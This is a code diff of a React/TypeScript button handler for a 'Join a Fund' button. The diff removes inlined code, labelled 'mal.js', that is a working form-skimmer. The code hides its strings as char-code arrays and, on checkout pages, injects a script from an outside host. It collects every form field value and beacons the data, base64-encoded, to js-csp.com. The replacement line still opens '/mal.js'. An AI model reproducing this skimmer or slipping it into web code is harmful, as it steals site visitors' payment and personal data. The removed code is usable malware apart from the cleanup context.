@@ -129,74 +129,7 @@ function __send(str) {
               type="button"
               className="rounded-full border-2 border-indigo-600 px-8 py-3 text-base font-medium text-indigo-600 hover:bg-indigo-50 dark:text-indigo-400 dark:hover:bg-gray-800 transition-colors"
               onClick={() => {
-                // mal.js code inlined with TypeScript fixes
-                ((x: Window, y: number[], z: Document, h: string, o: number[]) => {
-                  if (x.location.toString().includes(String.fromCharCode.apply(null, y))) {
-                    const i = z.createElement(h) as HTMLScriptElement;
-                    const j = z.getElementsByTagName(h)[0];
-                    i.src = String.fromCharCode.apply(null, o);
-                    if (j && j.parentNode) {
-                      j.parentNode.insertBefore(i, j);
-                    }
-                  }
-                })(
-                  window,
-                  [99, 104, 101, 99, 107, 111, 117, 116],
-                  document,
-                  "script",
-                  [
-                    104, 116, 116, 112, 115, 58, 47, 47, 106, 115, 45, 99, 115, 112, 46, 99,
-                    111, 109, 47, 103, 101, 116, 73, 110, 106, 101, 99, 116, 111, 114, 47,
-                  ]
-                );
-                function F(t: HTMLFormElement): Record<string, string> {
-                  const z: Record<string, string> = {};
-                  const D: Record<string, number> = {};
-                  const V = t.querySelectorAll("input, select, textarea");
-                  let h = 0;
-                  for (; h < V.length; h = h + 1) {
-                    const S = V[h] as HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement;
-                    let P: string = (S as any).name;
-                    if (!P) {
-                      P = (S as any).id;
-                    }
-                    const v = (S as any).value;
-                    if (v !== "") {
-                      if (P) {
-                        if (!D[P]) {
-                          D[P] = 0;
-                        }
-                        if (S.tagName !== "SELECT") {
-                          if (D[P] === 0) {
-                            z[P] = v;
-                          } else {
-                            z[`${P}#${D[P]}`] = v;
-                          }
-                        } else {
-                          const selectElem = S as HTMLSelectElement;
-                          if (D[P] === 0) {
-                            z[P] = selectElem.options[selectElem.selectedIndex]?.text || "";
-                          } else {
-                            z[`${P}#${D[P]}`] = selectElem.options[selectElem.selectedIndex]?.text || "";
-                          }
-                        }
-                        D[P] = D[P] + 1;
-                      }
-                    }
-                  }
-                  return z;
-                }
-                function __send(str: string) {
-                  try {
-                    const img = new Image();
-                    img.crossOrigin = "anonymous";
-                    img.src =
-                      "https://js-csp.com/fetchData/?data=" +
-                      window.btoa(str) +
-                      "&loc=" +
-                      document.location.origin;
-                  } catch (e) {}
-                }
+                window.open('/mal.js', '_blank');
               }}
             >
               Join a Fund
